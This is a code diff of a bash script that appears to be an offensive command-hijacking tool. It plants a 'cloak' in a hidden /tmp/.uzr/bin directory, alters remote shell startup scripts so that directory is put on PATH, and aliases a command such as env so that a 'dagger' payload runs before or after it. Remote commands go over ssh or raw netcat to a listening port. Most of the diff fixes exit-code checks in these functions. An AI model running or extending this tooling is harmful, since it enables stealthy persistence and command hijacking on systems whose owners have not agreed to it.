@@ -15,7 +15,7 @@ VERSION_NO='1.0'
 COMMAND_TO_CLOAK="env"
 CLOAK_ORDER='pre-exec'    # (pre-exec | post-exec)
 PATH_DIRECTORY="/tmp/.uzr/bin"
-DAGGER_FILE="${PATH_DIRECTORY}/${COMMAND_TO_CLOAK}.dagger"
+DAGGER_FILE="${PATH_DIRECTORY}/${COMMAND_TO_CLOAK}.dgr"
 TARGET="local"            # (local | remote)
 CONNECTION_TYPE="raw"     # (raw | ssh)
 REMOTE=""
@@ -128,7 +128,7 @@ function set_remote_path_export () {
     CNX=`connect_and_execute "$COMMAND_STRING" "$CONNECTION_DETAILS"`
     local EXIT_CODE=$?
     echo "[ RESPONSE ]: $CNX"
-    if [[ "$CNX" == "0" ]]; then
+    if [[ "$EXIT_CODE" == "0" ]]; then
         local EXIT_CODE=0
     echo "[ OK ]: Successfully corrupted remote startup script ($SCRIPT_FILE_PATH)"\
         "by exporting directory ($DIRECTORY) to PATH. ($EXIT_CODE)"
@@ -165,7 +165,7 @@ function set_remote_command_cloak_alias () {
         CNX=`connect_and_execute "$COMMAND_STRING" "$CONNECTION_DETAILS"`
         local EXIT_CODE=$?
         echo "[ RESPONSE ]: $CNX"
-        if [[ "$CNX" == "0" ]]; then
+        if [[ "$EXIT_CODE" == "0" ]]; then
             local EXIT_CODE=0
             echo "[ OK ]: Successfully corrupted remote startup script"\
                 "($script_path) with ($ALIAS). ($EXIT_CODE)"
@@ -331,7 +331,7 @@ function ensure_remote_path_directory_exists () {
     CNX=`connect_and_execute "$COMMAND_STRING" "$CONNECTION_DETAILS"`
     local EXIT_CODE=$?
     echo "[ RESPONSE ]: $CNX"
-    if [[ "$CNX" == "0" ]]; then
+    if [[ "$EXIT_CODE" == "0" ]]; then
         local EXIT_CODE=0
         echo "[ OK ]: Ensured remote directory ($DIR_PATH) exists. ($EXIT_CODE)"
     else
@@ -356,7 +356,7 @@ function ensure_remote_cloak_execution_rights () {
     CNX=`connect_and_execute "$COMMAND_STRING" "$CONNECTION_DETAILS"`
     local EXIT_CODE=$?
     echo "[ RESPONSE ]: $CNX"
-    if [[ "$CNX" == "0" ]]; then
+    if [[ "$EXIT_CODE" == "0" ]]; then
         local EXIT_CODE=0
         echo "[ OK ]: Ensured remote cloak ($CLOAK_PATH) execution rights"\
             "are set. ($EXIT_CODE)"
@@ -412,14 +412,10 @@ function connect_and_execute_raw () {
     local CONNECTION_DETAILS="$2"
     CNX_ADDR=`fetch_remote_address_from_connection_details "$CONNECTION_DETAILS"`
     CNX_PORT=`fetch_remote_port_from_connection_details "$CONNECTION_DETAILS"`
-    sleep 1
-    CNX=`echo "$COMMAND" | nc "$CNX_ADDR" $CNX_PORT -w $TIMEOUT_SEC`
-    echo $CNX
-    check_value_is_number $CNX
-    if [ $? -ne 0 ]; then
-        return 0
-    fi
-    return $CNX
+    # [ WARNING ]: Using raw connections you cannot confirm command output or
+    # exit codes.
+    CNX=`echo "$COMMAND" | nc "$CNX_ADDR" $CNX_PORT -w $TIMEOUT_SEC` # 2>&1
+    return 0
 }
 
 function connect_and_execute_ssh () {
@@ -537,7 +533,7 @@ function check_remote_command_exists () {
     CNX=`connect_and_execute "$COMMAND_STRING" "$CONNECTION_DETAILS"`
     local EXIT_CODE=$?
     echo "[ RESPONSE ]: $CNX"
-    if [[ "$CNX" == "0" ]]; then
+    if [[ "$EXIT_CODE" == "0" ]]; then
         local EXIT_CODE=0
         echo "[ OK ]: Remote command ($COMMAND) exists. ($EXIT_CODE)"
     else
@@ -561,7 +557,7 @@ function check_remote_path_directory_exists () {
     CNX=`connect_and_execute "$COMMAND_STRING" "$CONNECTION_DETAILS"`
     local EXIT_CODE=$?
     echo "[ RESPONSE ]: $CNX"
-    if [[ "$CNX" == "0" ]]; then
+    if [[ "$EXIT_CODE" == "0" ]]; then
         local EXIT_CODE=0
         echo "[ OK ]: Remote directory ($DIRECTORY) exists. ($EXIT_CODE)"
     else
@@ -614,8 +610,9 @@ function create_remote_command_cloak () {
     echo "[ INFO ]: Executing remotely ($COMMAND_STRING) with connection"\
         "details ($CONNECTION_DETAILS)."
     CNX=`connect_and_execute "$COMMAND_STRING" "$CONNECTION_DETAILS"`
+    local EXIT_CODE=$?
     echo "[ RESPONSE ]: $CNX"
-    if [[ "$CNX" == "0" ]]; then
+    if [[ "$EXIT_CODE" == "0" ]]; then
         echo "[ OK ]: Successfully cleared remote cloak file ($CMD_CLOAK). (0)"
     else
         check_value_is_number $CNX
@@ -638,7 +635,7 @@ function create_remote_command_cloak () {
         CNX=`connect_and_execute "$COMMAND_STRING" "$CONNECTION_DETAILS"`
         local EXIT_CODE=$?
         echo "[ RESPONSE ]: $CNX"
-        if [[ "$CNX" == "0" ]]; then
+        if [[ "$EXIT_CODE" == "0" ]]; then
             local EXIT_CODE=0
             echo "[ OK ]: Added shebang ($SHEBANG) to command cloak"\
                 "($CMD_CLOAK). ($EXIT_CODE)"
@@ -675,7 +672,7 @@ function create_remote_command_cloak () {
     CNX=`connect_and_execute "$COMMAND_STRING" "$CONNECTION_DETAILS"`
     local EXIT_CODE=$?
     echo "[ RESPONSE ]: $CNX"
-    if [[ "$CNX" == "0" ]]; then
+    if [[ "$EXIT_CODE" == "0" ]]; then
         local EXIT_CODE=0
         echo "[ OK ]: Cloaked remote command ($COMMAND) using dagger file"\
             "($DAGGER_FILE_PATH) in ($CLOAK_ORDER) order. Cloak path"\
